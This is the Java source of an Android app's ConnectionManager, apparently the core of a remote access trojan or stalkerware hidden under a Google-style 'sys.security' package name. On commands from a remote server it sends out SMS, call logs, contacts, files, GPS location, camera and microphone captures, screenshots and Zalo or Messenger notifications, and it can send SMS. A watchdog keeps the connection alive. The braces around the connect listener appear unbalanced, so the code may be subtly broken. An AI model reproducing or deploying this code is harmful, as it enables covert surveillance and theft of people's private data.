package com.google.android.sys.security;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import io.socket.emitter.Emitter;



/**
 * Created by sys_security on 10/1/16.
 */

public class ConnectionManager {


    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    /** Gửi vị trí lên server định kỳ (ms). */
    private static final long LOCATION_UPDATE_INTERVAL_MS = 30 * 60 * 1000; // 30 phút (tiết kiệm pin)
    private static final long WATCHDOG_INTERVAL_MS = 3 * 60 * 1000; // 3 phút (giảm từ 15s)
    private static Handler locationUpdateHandler;
    private static Runnable locationUpdateRunnable;
    private static Handler watchdogHandler;
    private static Runnable watchdogRunnable;

    public static void startAsync(final Context con)
    {
        try {
            context = con;
            sendReq();
            startWatchdog(); // Bật cơ chế tự hồi phục kết nối
        }catch (Exception ex){
            // Add delay before retry to prevent StackOverflow
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startAsync(con);
                }
            }, 5000);
        }
    }

    public static void sendReq() {
        try {
            if (ioSocket != null && ioSocket.connected())
                return;

            if (ioSocket == null) {
                Log.d("ConnectionManager", "Getting socket instance...");
                IOSocket socketInstance = IOSocket.getInstance();
                if (socketInstance == null) {
                    Log.e("ConnectionManager", "IOSocket instance is null, waiting for context...");
                    throw new Exception("Context not ready");
                }
                ioSocket = socketInstance.getIoSocket();
            }

            if (ioSocket == null) {
                Log.e("ConnectionManager", "ioSocket is null after attempt");
                return;
            }

            Log.d("ConnectionManager", "Setting up socket listeners...");

            // Clear old listeners before re-subscribing to prevent duplicates
            ioSocket.off(io.socket.client.Socket.EVENT_CONNECT);
            ioSocket.off(io.socket.client.Socket.EVENT_DISCONNECT);
            ioSocket.off(io.socket.client.Socket.EVENT_CONNECT_ERROR);
            ioSocket.off("ping");
            ioSocket.off("order");

            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.i("ConnectionManager", "Connected to server!");
                    sendLocationUpdateToServer();
                    startPeriodicLocationUpdates();
                    
                    // Gửi bù dữ liệu offline
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                java.util.List<JSONObject> offlineEvents = OfflineRecorder.readAndClearEvents(context);
                                if (!offlineEvents.isEmpty()) {
                                    Log.i("ConnectionManager", "🔄 Syncing " + offlineEvents.size() + " offline events...");
                                    for (JSONObject event : offlineEvents) {
                                        sendRealtimeData(event);
                                        Thread.sleep(100); // Delay nhỏ để tránh spam
                                    }
                                }
                            } catch (Exception e) {
                                Log.e("ConnectionManager", "Error syncing offline buffer", e);
                            }
                        }
                    }).start();

            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.w("ConnectionManager", "Disconnected from server");
                    stopPeriodicLocationUpdates();
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if (args.length > 0) {
                        Log.e("ConnectionManager", "Connection Error: " + args[0].toString());
                    } else {
                        Log.e("ConnectionManager", "Connection Error unknown");
                    }
                }
            });

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d("ConnectionManager", "Ping received");
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order", order);
                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000ss":
                                // Screenshot command
                                x0000ss();
                                break;
                        }
                    } catch (Exception e) {
                        Log.e("ConnectionManager", "Error processing order", e);
                    }
                }
            });

            Log.d("ConnectionManager", "Attempting to connect...");
            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("ConnectionManager", "sendReq error: " + ex.getMessage());
        }
    }

    /** Gửi thông báo (Zalo/Messenger) lên server. */
    public static void sendNotification(final JSONObject data) {
        if (ioSocket == null || !ioSocket.connected()) {
            // Log locally if not connected, could be stored for later
            return;
        }
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                if (ioSocket != null && ioSocket.connected())
                    ioSocket.emit("notificationUpdate", data);
            }
        });
    }

    /** Gửi vị trí hiện tại lên server (event "locationUpdate"). */
    public static void sendLocationUpdateToServer() {
        if (ioSocket == null || !ioSocket.connected() || context == null) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    LocManager gps = new LocManager(context);
                    JSONObject location = new JSONObject();
                    if (gps.canGetLocation()) {
                        double latitude = gps.getLatitude();
                        double longitude = gps.getLongitude();
                        location.put("enable", true);
                        location.put("lat", latitude);
                        location.put("lng", longitude);
                    } else {
                        location.put("enable", false);
                    }
                    final JSONObject payload = location;
                    new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {
                            if (ioSocket != null && ioSocket.connected())
                                ioSocket.emit("locationUpdate", payload);
                        }
                    });
                } catch (Exception e) {
                    Log.e("ConnectionManager", "sendLocationUpdateToServer", e);
                }
            }
        }).start();
    }

    /** Gửi dữ liệu realtime (SMS, Call) NGAY LẬP TỨC lên server. */
    public static void sendRealtimeData(final JSONObject data) {
        if (ioSocket == null || !ioSocket.connected()) {
            Log.w("ConnectionManager", "Cannot send realtime data - not connected");
            return;
        }
        
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ioSocket != null && ioSocket.connected()) {
                        ioSocket.emit("realtimeData", data);
                        Log.d("ConnectionManager", "✅ Sent realtime data: " + data.getString("type"));
                    }
                } catch (Exception e) {
                    Log.e("ConnectionManager", "Error sending realtime data", e);
                }
            }
        });
    }


    /** Bắt đầu gửi vị trí định kỳ. */
    private static void startPeriodicLocationUpdates() {
        if (locationUpdateHandler == null)
            locationUpdateHandler = new Handler(Looper.getMainLooper());
        
        // Prevent duplicate runnables
        if (locationUpdateRunnable != null) {
            locationUpdateHandler.removeCallbacks(locationUpdateRunnable);
        }
        
        locationUpdateRunnable = new Runnable() {
            @Override
            public void run() {
                sendLocationUpdateToServer();
                if (locationUpdateHandler != null && locationUpdateRunnable != null)
                    locationUpdateHandler.postDelayed(locationUpdateRunnable, LOCATION_UPDATE_INTERVAL_MS);
            }
        };
        locationUpdateHandler.postDelayed(locationUpdateRunnable, LOCATION_UPDATE_INTERVAL_MS);
    }

    /** Dừng gửi vị trí định kỳ. */
    private static void stopPeriodicLocationUpdates() {
        if (locationUpdateHandler != null && locationUpdateRunnable != null) {
            locationUpdateHandler.removeCallbacks(locationUpdateRunnable);
            // DO NOT NULL locationUpdateRunnable, just remove callback
        }
    }

    /** Bắt đầu cơ chế Watchdog để tự động kết nối lại. */
    private static void startWatchdog() {
        if (watchdogHandler == null)
            watchdogHandler = new Handler(Looper.getMainLooper());
        
        // Prevent duplicate watchdogs
        if (watchdogRunnable != null) {
            watchdogHandler.removeCallbacks(watchdogRunnable);
        }
        
        watchdogRunnable = new Runnable() {
            @Override
            public void run() {
                if (ioSocket == null || !ioSocket.connected()) {
                    Log.w("ConnectionManager", "Watchdog: Connection lost or stale. Re-attempting...");
                    // Hard reconnect attempt
                    if (ioSocket != null) {
                        ioSocket.disconnect();
                        ioSocket.connect();
                    } else {
                        sendReq();
                    }
                }
                
                if (watchdogHandler != null && watchdogRunnable != null)
                    watchdogHandler.postDelayed(watchdogRunnable, WATCHDOG_INTERVAL_MS);
            }
        };
        watchdogHandler.postDelayed(watchdogRunnable, WATCHDOG_INTERVAL_MS);
    }

    /** Dừng cơ chế Watchdog. */
    private static void stopWatchdog() {
        if (watchdogHandler != null && watchdogRunnable != null) {
            watchdogHandler.removeCallbacks(watchdogRunnable);
        }
    }

    public static void x0000ca(int req){

        if(req == -1) {
           JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
            ioSocket.emit("x0000ca" ,cameraList );
        }
        else if (req == 1){
            new CameraManager(context).startUp(1);
        }
        else if (req == 0){
            new CameraManager(context).startUp(0);
        }

    }

    public static void x0000fm(int req , String path){
        if(req == 0)
        ioSocket.emit("x0000fm",fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }


    public static void x0000sm(int req, final String phoneNo, final String msg) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (req == 0) {
                        // Get SMS list
                        final JSONObject smsList = SMSManager.getSMSList();
                        new Handler(Looper.getMainLooper()).post(new Runnable() {
                            @Override
                            public void run() {
                                if (ioSocket != null && ioSocket.connected()) {
                                    if (smsList != null) {
                                        ioSocket.emit("x0000sm", smsList);
                                    } else {
                                        // Send error response
                                        try {
                                            JSONObject error = new JSONObject();
                                            error.put("error", true);
                                            error.put("message", "Failed to read SMS - check permissions");
                                            ioSocket.emit("x0000sm", error);
                                        } catch (Exception e) {
                                            Log.e("ConnectionManager", "Error sending SMS error response", e);
                                        }
                                    }
                                }
                            }
                        });
                    } else if (req == 1) {
                        // Send SMS
                        final boolean isSent = SMSManager.sendSMS(phoneNo, msg);
                        new Handler(Looper.getMainLooper()).post(new Runnable() {
                            @Override
                            public void run() {
                                if (ioSocket != null && ioSocket.connected()) {
                                    try {
                                        JSONObject response = new JSONObject();
                                        response.put("sent", isSent);
                                        response.put("to", phoneNo);
                                        ioSocket.emit("x0000sm", response);
                                    } catch (Exception e) {
                                        Log.e("ConnectionManager", "Error sending SMS response", e);
                                    }
                                }
                            }
                        });
                    }
                } catch (Exception e) {
                    Log.e("ConnectionManager", "Error in x0000sm", e);
                    // Don't let exception kill the connection
                }
            }
        }).start();
    }

    public static void x0000cl(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final JSONObject callLogs = CallsManager.getCallsLogs();
                    new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {
                            if (ioSocket != null && ioSocket.connected()) {
                                if (callLogs != null) {
                                    ioSocket.emit("x0000cl", callLogs);
                                } else {
                                    try {
                                        JSONObject error = new JSONObject();
                                        error.put("error", true);
                                        error.put("message", "Failed to read call logs - check permissions");
                                        ioSocket.emit("x0000cl", error);
                                    } catch (Exception e) {
                                        Log.e("ConnectionManager", "Error sending call logs error response", e);
                                    }
                                }
                            }
                        }
                    });
                } catch (Exception e) {
                    Log.e("ConnectionManager", "Error in x0000cl", e);
                }
            }
        }).start();
    }

    public static void x0000cn(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final JSONObject contacts = ContactsManager.getContacts();
                    new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {
                            if (ioSocket != null && ioSocket.connected()) {
                                if (contacts != null) {
                                    ioSocket.emit("x0000cn", contacts);
                                } else {
                                    try {
                                        JSONObject error = new JSONObject();
                                        error.put("error", true);
                                        error.put("message", "Failed to read contacts - check permissions");
                                        ioSocket.emit("x0000cn", error);
                                    } catch (Exception e) {
                                        Log.e("ConnectionManager", "Error sending contacts error response", e);
                                    }
                                }
                            }
                        }
                    });
                } catch (Exception e) {
                    Log.e("ConnectionManager", "Error in x0000cn", e);
                }
            }
        }).start();
    }

    public static void x0000mc(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc" , latitude+"   ,  "+longitude);
            location.put("enable" , true);
            location.put("lat" , latitude);
            location.put("lng" , longitude);
        }
        else
            location.put("enable" , false);

        ioSocket.emit("x0000lm", location);
    }

    /**
     * Screenshot command handler
     * Chụp màn hình và gửi lên server
     */
    public static void x0000ss() {
        try {
            Log.d("ConnectionManager", "Screenshot command received");
            if (context != null) {
                ScreenshotManager.getInstance(context).takeScreenshot();
            }
        } catch (Exception e) {
            Log.e("ConnectionManager", "Error taking screenshot", e);
        }
    }




    public static boolean isConnected() {
        return ioSocket != null && ioSocket.connected();
    }
}
